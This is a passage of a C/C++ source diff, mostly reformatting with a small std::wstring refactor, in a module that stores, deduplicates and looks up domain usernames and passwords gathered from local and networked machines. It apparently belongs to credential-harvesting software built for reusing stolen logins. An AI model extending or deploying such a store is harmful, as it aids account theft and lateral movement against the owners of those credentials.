         // if we got here, then password is different, first check if it's origin is local machine
         if (acp->ceOrigin == CRED_ORIGIN_LOCAL) {
+
             // new chunk gathered from local machine contains another password, remove record from chain
             _cmChainRemoveChunk(chunk);
-            return FALSE;  // no enum needed further
-        }
+            return FALSE;    // no enum needed further
+
+        } // local cred origin
 
         // got here if origin is network, in this case check which one is more fresh
         if (_cmIsFileTimeGreater(acp->ftGathered, chunk->cr.ftGathered)) {
+
             _cmChainRemoveChunk(chunk);
-            return FALSE;  // no enum needed further
-        }
+            return FALSE;    // no enum needed further
+
+        } // fresher timestamp
 
         // so this is a true dup, mark and stop enum
         acp->bIsDuplicate = TRUE;
         return FALSE;
-    }
+
+    } // domain+username hash same
 
     return bRes;
 }
@@ -743,10 +788,12 @@ FILETIME cmftNow()
 // record is checked for dups (domain + username)
 BOOL cmAddCredentials(ADD_CREDS_RECORD *acr)
 {
-    BOOL bRes = FALSE;  // function result
+    BOOL bRes = FALSE;    // function result
     AC_CALLBACK_PARAMS acp = { 0 }; // internal params to be passed to enum function
-    CRED_LIST_CHUNK *chunk;  // new node to be allocated and filled
-    WCHAR wComputerNameBuff[MAX_COMPUTERNAME_LENGTH + 1] = { 0 };  // internal buffer for compname
+
+    CRED_LIST_CHUNK *chunk;        // new node to be allocated and filled
+    
+    WCHAR wComputerNameBuff[MAX_COMPUTERNAME_LENGTH + 1] = { 0 };    // internal buffer for compname
     DWORD dwLen;
 
     _cmCheckInitInternals();
@@ -758,50 +805,52 @@ BOOL cmAddCredentials(ADD_CREDS_RECORD *acr)
         if (GetComputerNameW((LPWSTR)&wComputerNameBuff, &dwLen)) {
             acr->wszSourceMachineName = (LPWSTR)&wComputerNameBuff;
         } else { DbgPrint("ERR: failed to GetComputerName(), le %04Xh", GetLastError()) }
-    }
+    } // !wszSourceMachineName
 
     // prepare values for searching - fill AC_CALLBACK_PARAMS values
     acp.i64DomainUsernameHash = HashStringW(acr->wszUsername);
-    if (acr->wszDomain) { acp.i64DomainUsernameHash ^= HashStringW(acr->wszDomain); }
+    if (acr->wszDomain) { acp.i64DomainUsernameHash ^= HashStringW(acr->wszDomain); } else { DbgPrint("WARN: no domain passed"); }
 
-    if (acr->wszPassword) { acp.i64PasswordHash = HashStringW(acr->wszPassword); }
+    if (acr->wszPassword) { acp.i64PasswordHash = HashStringW(acr->wszPassword); } else { DbgPrint("WARN: no password passed"); }
     acp.ceOrigin = acr->coOrigin;
     acp.ftGathered = acr->ftGathered;
 
     // enter lock
     EnterCriticalSection(&g_csListAccess);
 
-    // call enumer and processor
-    _cmEnumRecords(_cmcbAddCredentialsEnum, (LPVOID)&acp);
+        // call enumer and processor
+        _cmEnumRecords(_cmcbAddCredentialsEnum, (LPVOID)&acp);
 
-    // check if dup detected. NB: callback may remove any outdated records from chain, so it is safe to add here, if no dup detected
-    if (!acp.bIsDuplicate) {
-        // prepare new node and link it to chain
-        chunk = (CRED_LIST_CHUNK *)my_alloc(sizeof(CRED_LIST_CHUNK));
+        // check if dup detected. NB: callback may remove any outdated records from chain, so it is safe to add here, if no dup detected
+        if (!acp.bIsDuplicate) {
 
-        // move already calculated values
-        chunk->cr.i64DomainUsernameHash = acp.i64DomainUsernameHash;
-        chunk->cr.i64PasswordHash = acp.i64PasswordHash;
-        chunk->cr.i64DomainHash = HashStringW(acr->wszDomain);
+            // prepare new node and link it to chain
+            chunk = (CRED_LIST_CHUNK *)my_alloc(sizeof(CRED_LIST_CHUNK));
 
-        // calc, move all others
-        if (acr->wszDomain) { chunk->cr.i64DomainHash = HashStringW(acr->wszDomain); }
-        if (acr->wszSourceMachineName) { chunk->cr.i64SourceMachineHash = HashStringW(acr->wszSourceMachineName); }
-        chunk->cr.coOrigin = acr->coOrigin;
-        chunk->cr.coOrigin2 = acr->coOrigin2;
-        if (acr->bAccessLevel) { chunk->cr.bAccessLevel = acr->bAccessLevel; } else { chunk->cr.bAccessLevel = 1; }  // use level 1 by default
-        chunk->cr.ftReceived = acr->ftReceived;
-        chunk->cr.ftGathered = acr->ftGathered;
-        cmebEncodeW(acr->wszSourceMachineName, &chunk->cr.ebSourceMachineName);
-        cmebEncodeW(acr->wszDomain, &chunk->cr.ebDomain);
-        cmebEncodeW(acr->wszUsername, &chunk->cr.ebUsername);
-        cmebEncodeW(acr->wszPassword, &chunk->cr.ebPassword);
+            // move already calculated values
+            chunk->cr.i64DomainUsernameHash = acp.i64DomainUsernameHash;
+            chunk->cr.i64PasswordHash = acp.i64PasswordHash;
+            chunk->cr.i64DomainHash = HashStringW(acr->wszDomain);
 
-        // link 
-        _cmChainAddChunk(chunk);
+            // calc, move all others
+            if (acr->wszDomain) { chunk->cr.i64DomainHash = HashStringW(acr->wszDomain); }
+            if (acr->wszSourceMachineName) { chunk->cr.i64SourceMachineHash = HashStringW(acr->wszSourceMachineName); }
+            chunk->cr.coOrigin = acr->coOrigin;
+            chunk->cr.coOrigin2 = acr->coOrigin2;
+            if (acr->bAccessLevel) { chunk->cr.bAccessLevel = acr->bAccessLevel; } else { chunk->cr.bAccessLevel = 1; }    // use level 1 by default
+            chunk->cr.ftReceived = acr->ftReceived;
+            chunk->cr.ftGathered = acr->ftGathered;
+            cmebEncodeW(acr->wszSourceMachineName, &chunk->cr.ebSourceMachineName);
+            cmebEncodeW(acr->wszDomain, &chunk->cr.ebDomain);
+            cmebEncodeW(acr->wszUsername, &chunk->cr.ebUsername);
+            cmebEncodeW(acr->wszPassword, &chunk->cr.ebPassword);
 
-        bRes = TRUE;
-    }
+            // link 
+            _cmChainAddChunk(chunk);
+
+            bRes = TRUE;
+
+        } //else { DbgPrint("WARN: record decided to be a duplicate, no add"); }
 
     // exit lock 
     LeaveCriticalSection(&g_csListAccess);
@@ -815,7 +864,7 @@ BOOL cmAddCredentials(ADD_CREDS_RECORD *acr)
 */
 BOOL _cmIsHashInContext(UINT64 iHash, MY_STREAM *msContext)
 {
-    BOOL bRes = FALSE;  // func result
+    BOOL bRes = FALSE;    // func result
     UINT64 *pi64;
     SIZE_T lCount;
 
@@ -823,7 +872,9 @@ BOOL _cmIsHashInContext(UINT64 iHash, MY_STREAM *msContext)
     lCount = msContext->lDataLen / sizeof(UINT64);
 
     while (lCount) {
+
         if (*pi64 == iHash) { bRes = TRUE; break; }
+
         lCount--;
         pi64++;
     }
@@ -834,13 +885,17 @@ BOOL _cmIsHashInContext(UINT64 iHash, MY_STREAM *msContext)
 // callback enum function for cmGetCredentialsForDomain()
 BOOL CALLBACK _cmcbGetCredentialsForDomain(CRED_LIST_CHUNK *chunk, LPVOID pCallbackParams)
 {
-    BOOL bRes = TRUE;  // continue enum by default
-    GCFD_CALLBACK_PARAMS *gcp = (GCFD_CALLBACK_PARAMS *)pCallbackParams;  // params from enum caller
-    LPWSTR wszUsername = NULL, wszPassword = NULL;  // allocated by cmebDecodeW() buffers
+    BOOL bRes = TRUE;    // continue enum by default
+
+    GCFD_CALLBACK_PARAMS *gcp = (GCFD_CALLBACK_PARAMS *)pCallbackParams;    // params from enum caller
+
+    std::wstring wszUsername, wszPassword;
 
     if ((chunk->cr.i64DomainHash == gcp->i64DomainHash) || (!gcp->i64DomainHash)) {
+
         // query if this record was already returned according to passed CredsPassedContext structure
         if (!_cmIsHashInContext(chunk->cr.i64DomainUsernameHash, gcp->msEnumContext)) {
+
             // append hash to context
             gcp->msEnumContext->msWriteStream(gcp->msEnumContext, &chunk->cr.i64DomainUsernameHash, sizeof(UINT64));
 
@@ -848,20 +903,20 @@ BOOL CALLBACK _cmcbGetCredentialsForDomain(CRED_LIST_CHUNK *chunk, LPVOID pCallb
             gcp->bAccessLevel = chunk->cr.bAccessLevel;
 
             // decode u + p
-            if (!(wszUsername = cmebDecodeW(&chunk->cr.ebUsername))) { return bRes; }
-            if (!(wszPassword = cmebDecodeW(&chunk->cr.ebPassword))) { my_free(wszUsername);  return bRes; }
+            wszUsername = cmebDecodeW(&chunk->cr.ebUsername);
+            wszPassword = cmebDecodeW(&chunk->cr.ebPassword);
 
             // save results to output buffers
-            lstrcpyW(gcp->wszUsernameOut, wszUsername);
-            lstrcpyW(gcp->wszPasswordOut, wszPassword);
+            lstrcpyW(gcp->wszUsernameOut, wszUsername.c_str());
+            lstrcpyW(gcp->wszPasswordOut, wszPassword.c_str());
 
             // indicate we found a record
             gcp->bFound = TRUE;
-            bRes = FALSE;  // stop enum right away
+            bRes = FALSE;    // stop enum right away
 
-            my_free(wszUsername); my_free(wszPassword);
-        }
-    }
+        } // hash not in context yet
+
+    } // found matching domain hash
 
     return bRes;
 }
@@ -869,8 +924,8 @@ BOOL CALLBACK _cmcbGetCredentialsForDomain(CRED_LIST_CHUNK *chunk, LPVOID pCallb
 // searches local creds database for a suitable record
 // NB: wszDomain may be NULL
 BOOL cmGetCredentialsForDomain(LPWSTR wszDomain, LPWSTR wszUsernameOut, LPWSTR wszPasswordOut, MY_STREAM *msEnumContext)
-{  
-    BOOL bRes = FALSE;  // function result
+{    
+    BOOL bRes = FALSE;    // function result
     GCFD_CALLBACK_PARAMS gcp = { 0 }; // params structure to be passed to callback function
 
     if ((!wszUsernameOut) || (!wszPasswordOut) || (!msEnumContext)) { DbgPrint("ERR: invalid input params"); return bRes; }
@@ -878,7 +933,7 @@ BOOL cmGetCredentialsForDomain(LPWSTR wszDomain, LPWSTR wszUsernameOut, LPWSTR w
     _cmCheckInitInternals();
 
     // prepare params to be passed
-    if (wszDomain) { gcp.i64DomainHash = HashStringW(wszDomain); }
+    if (wszDomain) { gcp.i64DomainHash = HashStringW(wszDomain); } else { DbgPrint("WARN: no domain specified"); }
     gcp.wszUsernameOut = wszUsernameOut;
     gcp.wszPasswordOut = wszPasswordOut;
     gcp.msEnumContext = msEnumContext;
